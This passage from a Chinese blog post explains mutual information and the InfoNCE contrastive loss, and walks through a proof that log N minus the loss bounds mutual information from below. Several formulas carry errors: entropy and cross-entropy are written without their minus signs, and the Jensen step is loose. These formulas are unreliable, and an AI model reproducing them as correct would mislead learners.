之间的依赖程度。</p>\n<p>从直观上理解，互信息回答了这样一个问题：知道一个变量 Y 后，我们对另一个变量 X 的不确定性减少了多少？如果 X 的不确定性减少较多，则代表 XY 之间的互信息较大（为正）；如果 X 的不确定性没有减少，则 XY 是相互独立的，即 <span class=\"math inline\">\\(P(X)P(Y) = P(X,Y)\\)</span>，XY 之间的互信息为 0。</p>\n<p>数学上，互信息有三种等价的定义方式：</p>\n<p>① 基于联合分布 <span class=\"math inline\">\\(p(x,y)\\)</span> 和边缘分布 <span class=\"math inline\">\\(p(x)p(y)\\)</span> 的 KL 散度的形式</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = D_{KL}\\big(p(x,y) ~\\|~ p(x)p(y)\\big) = \\mathbb{E}_{p(x,y)}\\left[\\log\\frac{p(x,y)}{p(x)p(y)}\\right]\n\\]</div><p></p><p>这个形式直接体现了互信息的本质：它衡量的是联合分布 <span class=\"math inline\">\\(p(x,y)\\)</span> 与假设 X 和 Y 独立时的分布 <span class=\"math inline\">\\(p(x)p(y)\\)</span> 之间的差异。如果 X 和 Y 独立，这个差异为 0，否则为正数，差异越大说明两个变量关联越强。</p>\n<p>② 基于熵的形式</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = H(X) - H(X|Y) = H(Y) - H(Y|X)\n\\]</div><p></p><p>这里 <span class=\"math inline\">\\(H(X)=\\int p(x)\\log p(x)\\)</span> 是 X 的熵（不确定性），<span class=\"math inline\">\\(H(X|Y)\\)</span> 是已知 Y 时 X 的条件熵，互信息则是不确定性的减少量。</p>\n<p>③ 基于条件概率的形式</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = \\mathbb{E}_{p(x,y)}\\left[\\log\\frac{p(y|x)}{p(y)}\\right]\n\\]</div><p></p><p>这个形式在对比学习中特别有用，因为它直接表达了“在给定 x 的情况下，y 的概率相对于其先验概率的变化”。</p>\n<h3 id=\"12-infonce-loss-的数学形式\">1.2 InfoNCE loss 的数学形式</h3>\n<p>InfoNCE loss 是现代对比学习（Contrastive Learning）的核心。它的设计灵感来自一个简单的直觉：从一堆样本中，找出与给定样本 x 匹配的正样本 y。</p>\n<p>具体的，假设我们有一个正样本对 <span class=\"math inline\">\\((x, y)\\)</span>，比如同一张图片的两种不同数据增强结果，同时从数据集中随机采样 <span class=\"math inline\">\\(N-1\\)</span> 个负样本 <span class=\"math inline\">\\(y_2, y_3, ..., y_N\\)</span>。我们定义一个评分函数 <span class=\"math inline\">\\(f(x, y)\\)</span>（通常是神经网络）来衡量 x 和 y 的相似度。InfoNCE loss 的形式为：</p>\n<p></p><div class=\"math display\">\\[L = -\\mathbb{E}\\left[\\log\\frac{e^{f(x,y)}}{\\sum_{j=1}^{N} e^{f(x,y_j)}}\\right]\n\\]</div><p></p><p>其中，分子 <span class=\"math inline\">\\(e^{f(x,y)}\\)</span> 是正样本的得分，而分母 <span class=\"math inline\">\\(\\sum_{j=1}^{N} e^{f(x,y_j)}\\)</span> 是所有样本（1 个正样本 + N-1 个负样本）得分的总和。整个分式表示：给定 x 和 N 个候选 y，我们正确选出正样本 y 的概率。</p>\n<p>也可将其视为交叉熵损失（cross-entropy loss）的一个变种。交叉熵损失的形式如下：</p>\n<p></p><div class=\"math display\">\\[L_\\text{CE} = \\sum p(a)\\log \\hat p(a)\n\\]</div><p></p><p>其中，<span class=\"math inline\">\\(p(a)\\)</span> 为真是概率，而 <span class=\"math inline\">\\(\\hat p(a)\\)</span> 是我们估计的概率。在 InfoNCE loss 的 setting 中，真概率 <span class=\"math inline\">\\(p(x,y) = 1\\)</span>，而 <span class=\"math inline\">\\(p(x,y_j) = 0\\)</span>。</p>\n<h3 id=\"13-为什么我们希望最大化--的互信息\">1.3 为什么我们希望最大化 <span class=\"math inline\">\\((X,Y)\\)</span> 的互信息</h3>\n<p>在对比学习中，我们希望最大化正样本对的互信息，同时最小化正负样本之间的互信息。这迫使编码器提取出两个不同视图（view）的共享信息（比如同一张图片的不同数据增强版本、语言 / 视觉等不同的模态），这些信息通常对应于数据的内在语义，例如物体的类别、场景等，而忽略无关的噪声或增强引入的变化。</p>\n<p>在 <a href=\"https://www.cnblogs.com/moonout/tag/Skill%20Discovery/\" target=\"_blank\">skill discovery</a>（强化学习的一个子领域）中，我们希望最大化 skill z 和 state s 之间的互信息。从信息理论的角度，最大化 <span class=\"math inline\">\\(I(S;Z)\\)</span> 意味着，我们希望从状态 <span class=\"math inline\">\\(s\\)</span> 中尽可能多地获取关于技能 <span class=\"math inline\">\\(z\\)</span> 的信息。这确保了技能是“有区分度的”：看到智能体的行为，我们就能推断出它使用了哪个技能。</p>\n<h2 id=\"2-infonce-loss-与互信息的数学关联\">2 InfoNCE loss 与互信息的数学关联</h2>\n<p>核心结论：最小化 InfoNCE loss，等价于最大化互信息的一个下界。</p>\n<p>（互信息下界的含义是，互信息的取值将会大于这个值。从这个角度来说，下界的值越大，互信息的值就随之变大，所以，我们最小化 InfoNCE loss，相当于在推动互信息最大化。）</p>\n<p>具体来说，对于任意评分函数 <span class=\"math inline\">\\(f\\)</span>，有以下不等式成立：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) \\geq \\log N - L\n\\]</div><p></p><p>其中，<span class=\"math inline\">\\(L\\)</span> 是我们模型的 InfoNCE loss，这个差值就是互信息的下界。</p>\n<h2 id=\"3-证明过程\">3 证明过程</h2>\n<p>证明过程可以分为两步：</p>\n<h3 id=\"31-第一步证明使-infonce-loss-取值最小的-满足-\">3.1 第一步：证明使 InfoNCE loss 取值最小的 <span class=\"math inline\">\\(f(x,y)\\)</span>，满足 <span class=\"math inline\">\\(f(x, y) = \\log [p(y|x) / p(y)]\\)</span></h3>\n<p>我们要证明：使 InfoNCE loss 最小的 <span class=\"math inline\">\\(f(x,y)\\)</span> 满足：</p>\n<p></p><div class=\"math display\">\\[f(x,y) = \\log\\frac{p(y|x)}{p(y)}\n\\]</div><p></p><p>我们考虑 InfoNCE loss 的期望形式：</p>\n<p></p><div class=\"math display\">\\[L = -\\mathbb{E}_{p(x,y)} \\left[\\log\\frac{e^{f(x,y)}}{\\sum_{j=1}^{N} e^{f(x,y_j)}}\\right]\n\\]</div><p></p><p>我们可以将这个损失看作一个分类问题：给定 x 和 N 个样本 <span class=\"math inline\">\\({y_1, y_2, \\cdots, y_N}\\)</span>，其中只有 <span class=\"math inline\">\\(y_1=y\\)</span> 是正样本，其余是负样本。模型的任务是选出正样本。</p>\n<p>对于固定的 x，最优的分类器应该给出真实的后验概率，即给定 x 后，y 为这个 x 的正样本的概率。那么，真实的后验概率是多少呢？</p>\n<p>根据贝叶斯定理，在给定 x 和 y 样本集合的情况下，第 k 个样本是正样本的概率为（这个没完全看懂）：</p>\n<p></p><div class=\"math display\">\\[p(\\text{第 k 个是正样本} | x, {y_{1\\cdots N}}) = \\frac{p(y_k|x) \\prod_{i\\neq k} p(y_i) }{ \\sum_{j=1}^{N} p(y_j|x) \\prod_{i\\neq j} p(y_i)}\n\\]</div><p></p><p>化简后得到：</p>\n<p></p><div class=\"math display\">\\[= \\frac{p(y_k|x)/p(y_k)}{\\sum_{j=1}^{N} p(y_j|x)/p(y_j)}\n\\]</div><p></p><p>关键观察：如果我们取 <span class=\"math inline\">\\(f(x,y) = \\log\\frac{p(y|x)}{p(y)} + c(x)\\)</span>，其中 <span class=\"math inline\">\\(c(x)\\)</span> 是只依赖于 x 的任意函数，那么：</p>\n<p></p><div class=\"math display\">\\[\\frac{e^{f(x,y_k)}}{\\sum_{j=1}^{N} e^{f(x,y_j)}} = \\frac{p(y_k|x)/p(y_k)}{\\sum_{j=1}^{N} p(y_j|x)/p(y_j)}\n\\]</div><p></p><p>这正是真实的后验分布。因此，这个 <span class=\"math inline\">\\(f(x,y)\\)</span> 取值使得模型的输出分布与真实分布完全一致，从而最小化 InfoNCE loss。</p>\n<p>为简便起见，我们通常取 <span class=\"math inline\">\\(c(x)=0\\)</span>，得到最优 <span class=\"math inline\">\\(f(x,y)\\)</span>：</p>\n<p></p><div class=\"math display\">\\[f^*(x,y) = \\log\\frac{p(y|x)}{p(y)}\n\\]</div><p></p><h3 id=\"32-第二步将以上--代入推导互信息下界\">3.2 第二步：将以上 <span class=\"math inline\">\\(f(x,y)\\)</span> 代入，推导互信息下界</h3>\n<p>现在我们将最优 <span class=\"math inline\">\\(f^*(x,y)\\)</span> 代入 InfoNCE loss：</p>\n<p></p><div class=\"math display\">\\[L_{\\text{min}} = -\\mathbb{E}\\left[\\log\\frac{e^{f^*(x,y)}}{\\sum_{j=1}^{N} e^{f^*(x,y_j)}}\\right]\n= -\\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right]\n\\]</div><p></p><p>考虑互信息 <span class=\"math inline\">\\(I(X;Y)\\)</span> 的以下形式：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = \\mathbb{E}\\left[\\log\\frac{p(y|x)}{p(y)}\\right]\n\\]</div><p></p><p>现在，我们想建立 <span class=\"math inline\">\\(I(X;Y)\\)</span> 和 <span class=\"math inline\">\\(L_{\\text{min}}\\)</span> 的关系。通过巧妙的代数变换，把互信息拆开：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = \\mathbb{E}\\left[\\log\\frac{p(y|x)}{p(y)}\\right]\n= \\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right] + \\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right]\n\\]</div><p></p><p>第一项就是 <span class=\"math inline\">\\(-L_{\\text{min}}\\)</span> 吗？不完全是。实际上，<span class=\"math inline\">\\(-L_{\\text{min}}\\)</span> = 第一项 - log N：</p>\n<p></p><div class=\"math display\">\\[-L_{\\text{min}} = \\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right]\n= \\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right] - \\log N\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = (-L_{\\text{min}} + \\log N) + \\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right]\n\\]</div><p></p><p>现在看最后一项：<span class=\"math inline\">\\(\\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right]\\)</span></p>\n<p>由于对数函数是凹函数，根据琴生不等式（Jensen's Inequality）：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}[\\log(Z)] \\leq \\log(\\mathbb{E}[Z])\n\\]</div><p></p><p>因此：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right] \\leq \\log\\left(\\mathbb{E}\\left[\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right]\\right)\n\\]</div><p></p><p>我们计算这个 log 里面的期望：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}\\left[\\frac{p(y_j|x)}{p(y_j)}\\right] = \\int p(y_j) \\cdot \\frac{p(y_j|x)}{p(y_j)} dy_j = \\int p(y_j|x) dy_j = 1\n\\]</div><p></p><p>期望 = 1。所以：</p>\n<p></p><div class=\"math display\">\\[\\log\\left(\\mathbb{E}\\left[\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right]\\right) = \\log(1) = 0\n\\]</div><p></p><p>代入上式 = 0，使用琴生不等式，因此：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right] \\leq 0\n\\]</div><p></p><p>将上式 ≤ 0 代回原式：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) \\geq \\log N - L_{\\text{min}}\n\\]</div><p></p><p>由于 <span class=\"math inline\">\\(f^*\\)</span> 是最优的，所以对于任意评分函数 <span class=\"math inline\">\\(f\\)</span>，有 <span class=\"math inline\">\\(L(f) \\geq L_{\\text{min}}\\)</span>，得到：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) \\geq \\log N - L_{\\text{min}} \\geq \\log N - L(f)\n\\]</div><p></p><p>证毕：对于任意评分函数 <span class=\"math inline\">\\(f\\)</span>，<span class=\"math inline\">\\(\\log N - L(f)\\)</span> 是互信息 <span class=\"math inline\">\\(I(X;Y)\\)</span> 的一个下界。</p>\n<br />\n<br />\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-02 20:07</span>&nbsp;\n<a href=\"https://www.cnblogs.com/moonout\">MoonOut</a>&nbsp;\n阅读(<span id=\"post_view_count\">67</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}